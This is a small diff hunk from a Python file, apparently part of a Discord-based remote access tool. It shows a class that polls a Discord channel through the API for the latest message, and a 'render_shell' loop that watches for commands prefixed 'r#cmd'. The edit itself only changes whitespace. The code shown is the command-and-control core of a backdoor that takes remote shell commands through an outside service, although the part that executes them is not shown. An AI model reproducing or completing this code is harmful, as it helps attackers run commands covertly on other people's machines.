@@ -47,7 +47,7 @@ class Discord:
     def message_content(self):
         response = json.loads(urlopen(Request(f"https://discord.com/api/v9/channels/{channel_id[1]}/messages", headers=self.headers, method="GET").read().decode())
         return response[0]["content"]
-
+        
     def render_shell(self):
         while True:
             if self.message_content().startswith("r#cmd"):
